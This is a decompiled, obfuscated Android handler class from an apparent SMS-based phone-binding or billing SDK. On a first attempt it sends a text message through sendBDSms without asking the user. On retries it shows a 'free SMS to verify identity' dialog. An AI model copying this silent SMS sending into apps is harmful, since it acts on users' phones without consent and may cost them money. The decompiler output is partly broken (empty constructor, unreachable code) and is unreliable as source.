package com.yl.ml.b;

import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.os.Handler;
import android.os.Message;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.TextUtil;
import com.yl.ml.common.AppDo;
import com.yl.ml.common.AutoBDPhoneUtil;
import com.yl.ml.listen.PCallback;
import com.yl.ml.view.LoadingDialog;

final class H
  extends Handler
{
  H(MA paramMA, PCallback paramPCallback, String paramString) {}
  
  public final void handleMessage(Message paramMessage)
  {
    switch (paramMessage.what)
    {
    case 0: 
    default: 
      return;
    case 1: 
      if (TextUtil.notNull(MA.b(this.ak).readString("province", "")))
      {
        MA.a(this.ak, this.ap, this.ay);
        return;
      }
      int i = MA.b(this.ak).readInt("zcnum", 0);
      if (i > 2)
      {
        LogUtil.v("发送失败超过3次");
        MA.a(this.ak, this.ap, MA.c());
        return;
      }
      if (i > 0)
      {
        new AlertDialog.Builder(MA.a(this.ak)).setTitle("提示").setMessage("发送免费短信验证身份。").setPositiveButton("确定", new I(this, this.ap)).setNegativeButton("取消", new J(this, this.ap)).setCancelable(false).create().show();
        return;
      }
      MA.a(this.ak, MA.a(this.ak), null, this.ap);
      AutoBDPhoneUtil.sendBDSms(MA.a(this.ak));
      return;
    }
    if (MA.e(this.ak) == 0)
    {
      MA.d(this.ak).dismiss();
      MA.a(this.ak, this.ap, MA.c(), null, 40041, 1);
      return;
    }
    AppDo.errorRecord(MA.a(this.ak), 40041, MA.c(), null, MA.d());
    MA.b(this.ak, this.ap);
  }
}
